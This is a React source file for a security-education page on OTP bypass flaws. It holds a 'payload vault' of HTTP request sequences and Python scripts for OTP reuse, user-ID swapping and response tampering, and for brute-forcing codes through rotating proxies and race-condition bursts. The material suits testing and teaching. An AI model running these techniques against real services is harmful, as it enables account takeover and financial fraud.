import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import VulnerabilityHeader from './components/VulnerabilityHeader';
import ExplanationCard from './components/ExplanationCard';
import FilterControls from './components/FilterControls';
import PayloadCard from './components/PayloadCard';
import TechniqueSection from './components/TechniqueSection';
import { RelatedVulnerabilities } from '../../components/shared';

const OTPBypassDetails = () => {
  const [isProMode, setIsProMode] = useState(false);
  const [filters, setFilters] = useState({
    complexity: 'All',
    category: 'All',
    scenario: 'All'
  });
  const [filteredPayloads, setFilteredPayloads] = useState([]);

  const explanation = {
    fundamentals: "OTP (One-Time Password) bypass vulnerabilities exploit logic flaws in authentication mechanisms that rely on temporary codes for verification. These vulnerabilities arise when applications fail to properly validate OTP usage, expiration, binding to user sessions, or rate limiting. Attackers can manipulate the OTP verification process to gain unauthorized access without valid credentials, leading to account takeover and security breaches.",
    attackVectors: [
      {
        name: "OTP Reuse Attack",
        description: "Exploiting systems that don't invalidate OTPs after successful use, allowing the same code to be used multiple times for authentication or verification."
      },
      {
        name: "OTP Not Bound to Session",
        description: "Manipulating OTP verification by using codes generated for one user/session on a different account or session due to lack of proper binding."
      },
      {
        name: "Rate Limit Bypass",
        description: "Circumventing OTP attempt limits through request manipulation, IP rotation, or exploiting race conditions to brute force valid OTP codes."
      },
      {
        name: "Response Manipulation",
        description: "Intercepting and modifying server responses to bypass OTP verification, often by changing response codes or removing OTP validation steps entirely."
      }
    ],
    impacts: [
      {
        title: "Account Takeover",
        description: "Attackers can gain complete control of user accounts by bypassing OTP verification during login, password reset, or account recovery processes."
      },
      {
        title: "Unauthorized Transactions",
        description: "Bypassing OTP verification in payment systems allows attackers to perform unauthorized financial transactions, transfers, or purchases."
      },
      {
        title: "Data Breach",
        description: "Gaining access to user accounts leads to exposure of sensitive personal information, financial data, and confidential communications."
      },
      {
        title: "Privilege Escalation",
        description: "Exploiting OTP bypass in administrative functions can allow attackers to elevate privileges and gain access to restricted system features."
      }
    ]
  };

  const payloads = [
    {
      name: "OTP Reuse - Login Flow",
      description: "Exploit lack of OTP invalidation after successful use. Test if the same OTP can be reused for multiple authentication attempts.",
      type: "Logic Flaw",
      difficulty: "beginner",
      code: "# Step 1: Request OTP\nPOST /api/auth/request-otp\n{\"phone\": \"+1234567890\"}\n\n# Step 2: Login with OTP\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"123456\"}\n\n# Step 3: Try reusing same OTP\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"123456\"}\n# If successful → OTP reuse vulnerability",
      beginnerEffectiveness: 90,
      proEffectiveness: 75,
      scenario: "Login"
    },
    {
      name: "OTP Not Invalidated on Logout",
      description: "Test if OTP remains valid even after user logout or session termination, allowing replay attacks.",
      type: "Session Management",
      difficulty: "beginner",
      code: "# Step 1: Request and verify OTP\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"123456\"}\n\n# Step 2: Logout\nPOST /api/auth/logout\n\n# Step 3: Try same OTP again\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"123456\"}\n# Should fail but doesn't → Vulnerability",
      beginnerEffectiveness: 85,
      proEffectiveness: 80,
      scenario: "Authentication"
    },
    {
      name: "Frontend-Only OTP Validation",
      description: "Bypass OTP verification by manipulating client-side code or intercepting requests before frontend validation.",
      type: "Logic Flaw",
      difficulty: "intermediate",
      code: "# Intercept request and remove OTP validation\nPOST /api/auth/login\n{\n  \"phone\": \"+1234567890\",\n  \"otp\": \"\",\n  \"verified\": true  // Manipulated field\n}\n\n# OR bypass frontend by direct API call\nPOST /api/user/update\n{\n  \"phone\": \"+1234567890\",\n  \"skip_otp\": true\n}",
      beginnerEffectiveness: 80,
      proEffectiveness: 88,
      scenario: "Verification"
    },
    {
      name: "OTP Step Skipped",
      description: "Skip OTP verification step entirely by directly accessing protected endpoints without completing authentication flow.",
      type: "Logic Flaw",
      difficulty: "intermediate",
      code: "# Normal flow: request → verify → access\n# Attack: Skip verify step\n\n# Step 1: Request OTP (don't verify)\nPOST /api/auth/request-otp\n{\"phone\": \"+1234567890\"}\n\n# Step 2: Direct access to protected endpoint\nGET /api/user/dashboard\nCookie: session=temp_session_id\n\n# If accessible → OTP step can be skipped",
      beginnerEffectiveness: 75,
      proEffectiveness: 92,
      scenario: "Authentication"
    },
    {
      name: "OTP Not Bound to User",
      description: "Use OTP generated for one user to authenticate as a different user due to lack of user-OTP binding.",
      type: "Logic Flaw",
      difficulty: "advanced",
      code: "# Step 1: Request OTP for User A\nPOST /api/auth/request-otp\n{\"phone\": \"+1111111111\"}  # User A\n\n# Step 2: Intercept OTP: 123456\n\n# Step 3: Use User A's OTP for User B\nPOST /api/auth/verify-otp\n{\n  \"phone\": \"+2222222222\",  # User B's phone\n  \"otp\": \"123456\"  # User A's OTP\n}\n# If successful → OTP not bound to user",
      beginnerEffectiveness: 70,
      proEffectiveness: 95,
      scenario: "Multi-user"
    },
    {
      name: "OTP Usable Across Accounts",
      description: "Exploit OTP that can be used for multiple accounts or purposes beyond its intended scope.",
      type: "Logic Flaw",
      difficulty: "advanced",
      code: "# Generate OTP for password reset\nPOST /api/auth/forgot-password\n{\"email\": \"user@example.com\"}\n# Receive OTP: 123456\n\n# Try using same OTP for login\nPOST /api/auth/login\n{\"email\": \"user@example.com\", \"otp\": \"123456\"}\n\n# Or try on different account\nPOST /api/auth/login\n{\"email\": \"victim@example.com\", \"otp\": \"123456\"}",
      beginnerEffectiveness: 65,
      proEffectiveness: 90,
      scenario: "Cross-function"
    },
    {
      name: "Rate Limit Bypass - IP Rotation",
      description: "Circumvent OTP attempt limits by rotating IP addresses or using proxy networks for brute force attacks.",
      type: "Rate Limiting",
      difficulty: "expert",
      code: "import requests\nimport itertools\n\nproxies = ['proxy1:8080', 'proxy2:8080', 'proxy3:8080']\notp_range = range(100000, 999999)\n\nfor otp, proxy in zip(otp_range, itertools.cycle(proxies)):\n    response = requests.post(\n        'https://api.example.com/verify-otp',\n        json={'phone': '+1234567890', 'otp': str(otp)},\n        proxies={'http': proxy, 'https': proxy}\n    )\n    if response.status_code == 200:\n        print(f'Valid OTP found: {otp}')\n        break",
      beginnerEffectiveness: 55,
      proEffectiveness: 93,
      scenario: "Brute Force"
    },
    {
      name: "OTP Valid After Password Change",
      description: "Test if OTP remains valid even after critical account changes like password reset or email update.",
      type: "Session Management",
      difficulty: "intermediate",
      code: "# Step 1: Request OTP for password reset\nPOST /api/auth/forgot-password\n{\"email\": \"user@example.com\"}\n# OTP sent: 123456\n\n# Step 2: Change password through different method\nPOST /api/user/change-password\n{\"old_password\": \"old123\", \"new_password\": \"new456\"}\n\n# Step 3: Try original OTP\nPOST /api/auth/verify-reset-otp\n{\"email\": \"user@example.com\", \"otp\": \"123456\"}\n# Should be invalid but works → Vulnerability",
      beginnerEffectiveness: 78,
      proEffectiveness: 86,
      scenario: "Password Reset"
    },
    {
      name: "OTP Race Condition",
      description: "Exploit race conditions by sending multiple parallel OTP verification requests to bypass rate limits or validation.",
      type: "Race Condition",
      difficulty: "expert",
      code: "import asyncio\nimport aiohttp\n\nasync def verify_otp(session, otp):\n    async with session.post(\n        'https://api.example.com/verify-otp',\n        json={'phone': '+1234567890', 'otp': otp}\n    ) as response:\n        return await response.json()\n\nasync def race_condition_attack():\n    async with aiohttp.ClientSession() as session:\n        tasks = [verify_otp(session, '123456') for _ in range(100)]\n        results = await asyncio.gather(*tasks)\n        # Check for successful verifications",
      beginnerEffectiveness: 50,
      proEffectiveness: 97,
      scenario: "Advanced"
    },
    {
      name: "OTP Resend Returns Same Code",
      description: "Exploit systems that return the same OTP on multiple resend requests, making brute force attacks easier.",
      type: "Logic Flaw",
      difficulty: "beginner",
      code: "# Step 1: Request OTP\nPOST /api/auth/request-otp\n{\"phone\": \"+1234567890\"}\n# OTP sent: 123456\n\n# Step 2: Request OTP again\nPOST /api/auth/request-otp\n{\"phone\": \"+1234567890\"}\n# Same OTP sent: 123456\n\n# This allows unlimited attempts with known OTP\n# No expiration of previous OTP",
      beginnerEffectiveness: 88,
      proEffectiveness: 82,
      scenario: "OTP Generation"
    },
    {
      name: "Remove OTP Parameter",
      description: "Bypass OTP verification by completely removing the OTP parameter from the request.",
      type: "Logic Flaw",
      difficulty: "beginner",
      code: "# Normal request\nPOST /api/auth/verify\n{\n  \"phone\": \"+1234567890\",\n  \"otp\": \"123456\"\n}\n\n# Attack: Remove OTP parameter\nPOST /api/auth/verify\n{\n  \"phone\": \"+1234567890\"\n}\n\n# If authentication succeeds → Parameter validation flaw",
      beginnerEffectiveness: 92,
      proEffectiveness: 78,
      scenario: "Parameter Manipulation"
    },
    {
      name: "OTP Verification via API Endpoint",
      description: "Identify and exploit separate API endpoints that bypass web-based OTP verification.",
      type: "API Exploitation",
      difficulty: "intermediate",
      code: "# Web flow requires OTP\nPOST /web/auth/login\n{\"username\": \"user\", \"otp\": \"123456\"}\n\n# API endpoint might skip OTP\nPOST /api/v1/auth/login\n{\n  \"username\": \"user\",\n  \"password\": \"pass123\"\n}\n\n# Or use different API version\nPOST /api/v2/mobile/login\n{\"device_id\": \"xyz\", \"username\": \"user\"}",
      beginnerEffectiveness: 76,
      proEffectiveness: 89,
      scenario: "API"
    },
    {
      name: "Change User ID in OTP Request",
      description: "Manipulate user identifier in OTP verification to authenticate as different user.",
      type: "Logic Flaw",
      difficulty: "intermediate",
      code: "# Step 1: Request OTP for your account\nPOST /api/auth/request-otp\n{\"user_id\": 12345, \"phone\": \"+1234567890\"}\n# OTP received: 123456\n\n# Step 2: Change user_id in verification\nPOST /api/auth/verify-otp\n{\n  \"user_id\": 99999,  // Victim's ID\n  \"otp\": \"123456\"  // Your OTP\n}\n\n# If successful → Account takeover",
      beginnerEffectiveness: 72,
      proEffectiveness: 94,
      scenario: "Account Takeover"
    },
    {
      name: "OTP Bypass via Status Code Manipulation",
      description: "Intercept and modify HTTP status codes or response data to bypass OTP verification checks.",
      type: "Response Manipulation",
      difficulty: "advanced",
      code: "# Intercept verification response\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"000000\"}\n\n# Original Response: 401 Unauthorized\n{\n  \"success\": false,\n  \"message\": \"Invalid OTP\"\n}\n\n# Modified Response: Change to 200 OK\n{\n  \"success\": true,\n  \"message\": \"OTP verified\",\n  \"token\": \"generated_token\"\n}",
      beginnerEffectiveness: 68,
      proEffectiveness: 91,
      scenario: "Response Manipulation"
    },
    {
      name: "OTP Required Only Once",
      description: "Exploit systems where OTP is verified once but subsequent actions don't require re-verification.",
      type: "Session Management",
      difficulty: "beginner",
      code: "# Step 1: Verify OTP for login\nPOST /api/auth/verify-otp\n{\"phone\": \"+1234567890\", \"otp\": \"123456\"}\n\n# Step 2: Perform sensitive action without OTP\nPOST /api/transfer/money\n{\n  \"from_account\": \"123\",\n  \"to_account\": \"456\",\n  \"amount\": 10000\n}\n# No OTP required for transaction → Vulnerability",
      beginnerEffectiveness: 84,
      proEffectiveness: 79,
      scenario: "Transaction"
    }
  ];

  const techniques = [
    {
      title: "Testing OTP Logic Flaws",
      summary: "Systematic approach to identifying authentication bypass vulnerabilities in OTP implementation.",
      steps: [
        "Request OTP for your test account and note the code, timestamp, and any unique identifiers",
        "Test OTP reusability by attempting to use the same code multiple times after successful verification",
        "Check if OTP remains valid after logout, password change, or session termination",
        "Attempt to skip OTP verification step by directly accessing protected endpoints",
        "Test cross-account OTP usage by trying one user\'s OTP on another user\'s authentication flow"
      ],
      codeExample: "# Comprehensive OTP Logic Testing\n\n# Test 1: OTP Reuse\nPOST /verify-otp → Success\nPOST /verify-otp (same OTP) → Should fail\n\n# Test 2: OTP After Logout\nPOST /verify-otp → Success\nPOST /logout\nPOST /verify-otp (same OTP) → Should fail\n\n# Test 3: Skip Verification\nPOST /request-otp\nGET /dashboard (without verify) → Should fail\n\n# Test 4: Cross-Account\nUser A: POST /request-otp → OTP: 123456\nUser B: POST /verify-otp {otp: '123456'} → Should fail",
      realWorldScenario: "A major fintech app allowed OTP reuse for 24 hours after first successful verification. Security researchers discovered that a single OTP could be used unlimited times within this window, enabling account takeover attacks. The vulnerability affected over 2 million users before being patched."
    },
    {
      title: "Rate Limit Bypass Techniques",
      summary: "Advanced methods to circumvent OTP attempt restrictions and brute force verification codes.",
      steps: [
        "Test basic rate limiting by sending multiple OTP verification requests and identify lockout threshold",
        "Use IP rotation through proxy networks or VPN services to bypass IP-based rate limits",
        "Exploit race conditions by sending concurrent requests before rate limit counter updates",
        "Try different request headers (User-Agent, X-Forwarded-For) to reset rate limit counters",
        "Look for alternative endpoints or API versions that might have weaker rate limiting"
      ],
      codeExample: "# IP Rotation Script\nimport requests\nfrom itertools import cycle\n\nproxies = [\n    {'http': 'proxy1:8080'},\n    {'http': 'proxy2:8080'},\n    {'http': 'proxy3:8080'}\n]\n\nproxy_pool = cycle(proxies)\n\nfor otp in range(100000, 999999):\n    proxy = next(proxy_pool)\n    response = requests.post(\n        'https://api.example.com/verify-otp',\n        json={'phone': '+1234567890', 'otp': str(otp)},\n        proxies=proxy,\n        headers={'X-Forwarded-For': f'192.168.{otp % 255}.{otp % 255}'}\n    )\n    \n    if response.status_code == 200:\n        print(f'Valid OTP: {otp}')\n        break",
      realWorldScenario: "E-commerce platform implemented rate limiting based only on IP address. Attackers used residential proxy networks to rotate through thousands of IPs, successfully brute-forcing 4-digit OTP codes within minutes. The attack compromised over 10,000 customer accounts before detection."
    },
    {
      title: "Response Manipulation Attacks",
      summary: "Exploiting client-side validation and response handling to bypass OTP verification.",
      steps: [
        "Use Burp Suite or similar proxy to intercept OTP verification responses",
        "Identify response fields that indicate verification status (success, verified, token)",
        "Modify response from failure to success and observe if client accepts it",
        "Test if frontend relies on HTTP status codes (change 401 to 200)",
        "Check if application validates response integrity or blindly trusts modified data"
      ],
      codeExample: "# Original Failed Response\nHTTP/1.1 401 Unauthorized\n{\n  \"success\": false,\n  \"verified\": false,\n  \"message\": \"Invalid OTP code\"\n}\n\n# Modified to Success Response\nHTTP/1.1 200 OK\n{\n  \"success\": true,\n  \"verified\": true,\n  \"message\": \"OTP verified successfully\",\n  \"auth_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n  \"user_id\": 12345\n}\n\n# Frontend might blindly trust this modified response\n# and grant authentication without valid OTP",
      realWorldScenario: "Mobile banking app validated OTP verification entirely on the client side. Security auditors discovered that by intercepting and modifying the API response to show 'verified: true', they could bypass OTP verification completely. The vulnerability allowed unauthorized access to any account knowing only the phone number."
    }
  ];

  const relatedVulnerabilities = [
    {
      name: "Insecure Direct Object Reference (IDOR)",
      description: "Access control vulnerability often combined with OTP bypass to manipulate user identifiers and gain unauthorized access to accounts.",
      severity: "high",
      icon: "Lock",
      path: "/idor"
    },
    {
      name: "Cross-Site Scripting (XSS)",
      description: "Can be used to steal OTP codes from phishing pages or intercept OTP verification flows through malicious scripts.",
      severity: "high",
      icon: "Code",
      path: "/xss"
    },
    {
      name: "CRLF Injection",
      description: "HTTP header manipulation that can be leveraged to bypass OTP verification or inject malicious responses.",
      severity: "medium",
      icon: "FileText",
      path: "/crlf-injection"
    }
  ];

  useEffect(() => {
    filterPayloads();
  }, [filters]);

  const filterPayloads = () => {
    let filtered = [...payloads];

    if (filters?.complexity !== 'All') {
      filtered = filtered?.filter(p => p?.difficulty?.toLowerCase() === filters?.complexity?.toLowerCase());
    }

    if (filters?.category !== 'All') {
      filtered = filtered?.filter(p => p?.type?.toLowerCase()?.includes(filters?.category?.toLowerCase()));
    }

    if (filters?.scenario !== 'All') {
      filtered = filtered?.filter(p => p?.scenario?.toLowerCase()?.includes(filters?.scenario?.toLowerCase()));
    }

    setFilteredPayloads(filtered);
  };

  const handleFilterChange = (filterType, value) => {
    setFilters(prev => ({
      ...prev,
      [filterType]: value
    }));
  };

  const handleModeToggle = (isPro) => {
    setIsProMode(isPro);
  };

  return (
    <>
      <Helmet>
        <title>OTP Bypass Vulnerability Details - Trinet_Layer</title>
        <meta name="description" content="Comprehensive guide to OTP bypass and authentication logic flaws with practical exploitation techniques, payloads, and real-world attack scenarios for security researchers." />
      </Helmet>
      <div className="min-h-screen bg-background">
        <Sidebar />

        <main className="lg:ml-[280px] min-h-screen lg:w-[calc(100%-280px)] overflow-x-hidden">
          <div className="sticky top-0 z-40 bg-background/80 backdrop-blur-xl border-b border-border">
            <div className="max-w-[1400px] mx-auto pl-16 pr-4 md:px-6 lg:px-8 py-4 md:py-5">
              <GlobalSearch />
            </div>
          </div>

          <div className="max-w-[1400px] mx-auto px-4 md:px-6 lg:px-8 py-6 md:py-8 lg:py-10">
            <Breadcrumb />

            <VulnerabilityHeader
              title="OTP Bypass & Authentication Logic Flaws"
              severity="high"
              lastUpdated="Jan 16, 2026"
            />

            <ExplanationCard explanation={explanation} />

            <FilterControls
              filters={filters}
              onFilterChange={handleFilterChange}
              isProMode={isProMode}
              onModeToggle={handleModeToggle}
            />

            <div className="mb-6 md:mb-8 lg:mb-10">
              <div className="flex items-center justify-between mb-6 md:mb-8">
                <h2 className="text-xl md:text-2xl lg:text-3xl font-semibold text-foreground">
                  OTP Bypass Payload Vault
                </h2>
                <div className="text-sm md:text-base text-muted-foreground font-medium">
                  {filteredPayloads?.length} {filteredPayloads?.length === 1 ? 'technique' : 'techniques'}
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 md:gap-8">
                {filteredPayloads?.map((payload, index) => (
                  <PayloadCard
                    key={index}
                    payload={payload}
                    isProMode={isProMode}
                  />
                ))}
              </div>

              {filteredPayloads?.length === 0 && (
                <div className="text-center py-12 md:py-16 lg:py-20">
                  <div className="w-16 h-16 md:w-20 md:h-20 mx-auto mb-4 md:mb-6 flex items-center justify-center bg-muted/30 border border-border rounded-xl">
                    <svg className="w-8 h-8 md:w-10 md:h-10 text-muted-foreground" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                  </div>
                  <h3 className="text-lg md:text-xl font-body font-medium text-foreground mb-2">
                    No techniques found
                  </h3>
                  <p className="text-sm md:text-base text-muted-foreground font-medium">
                    Try adjusting your filters to see more results
                  </p>
                </div>
              )}
            </div>

            <TechniqueSection techniques={techniques} />

            <RelatedVulnerabilities vulnerabilities={relatedVulnerabilities} />
          </div>
        </main>
      </div>
    </>
  );
};

export default OTPBypassDetails;